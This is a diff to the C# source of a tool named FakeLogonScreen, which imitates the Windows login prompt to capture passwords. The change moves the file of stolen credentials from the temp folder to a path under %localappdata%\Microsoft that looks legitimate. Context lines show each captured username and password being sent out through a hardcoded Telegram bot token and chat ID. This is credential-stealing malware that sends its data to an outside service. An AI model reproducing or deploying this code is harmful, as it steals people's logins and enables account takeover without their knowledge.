@@ -94,10 +94,10 @@ namespace FakeLogonScreen
                 Console.WriteLine(line);
 
                 // Store username and password in %localappdata%\Microsoft\user.db
-                //string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+                string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                 //string path = string.Format(@"{0}\user.db", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                 //MessageBox.Show(path);
-                string path = "c:\\windows\\temp\\user.db";
+                //string path = "c:\\windows\\temp\\user.db";
                 using (StreamWriter file = new StreamWriter(path, true))
                 {
                     file.WriteLine(line);
@@ -125,7 +125,7 @@ namespace FakeLogonScreen
             // If correct password, save and close screen
             else
             {
-                string sret=TelegramSendMessage("579107378:AAFN2s602Cn4tEVw8T3CNBpVVrhRVrXia8Q", "-333040192", string.Format("{0}: {1}", this.Username, password));
+               string sret=TelegramSendMessage("579107378:AAFN2s602Cn4tEVw8T3CNBpVVrhRVrXia8Q", "-333040192", string.Format("{0}: {1}", this.Username, password));
                 // Show all windows again
                 IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                 SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
